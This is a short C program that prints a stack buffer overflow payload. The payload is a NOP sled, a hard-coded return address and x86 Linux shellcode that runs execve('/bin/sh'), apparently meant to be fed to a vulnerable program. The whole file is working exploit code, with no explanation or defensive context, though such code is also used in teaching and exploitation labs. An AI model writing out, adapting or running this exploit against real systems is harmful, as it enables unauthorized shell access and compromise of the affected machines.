#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 200

void main(){


char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";


int i=0;

for(i=0; i<76; i++){
        printf("\x90");
}

printf("\x10\xf7\xff\xbf");

for(i=80; i<100; i++){
        printf("\x90");
}

printf("%s", shellcode);

for(i=0; i<47; i++){
        printf("\x90");
}

}

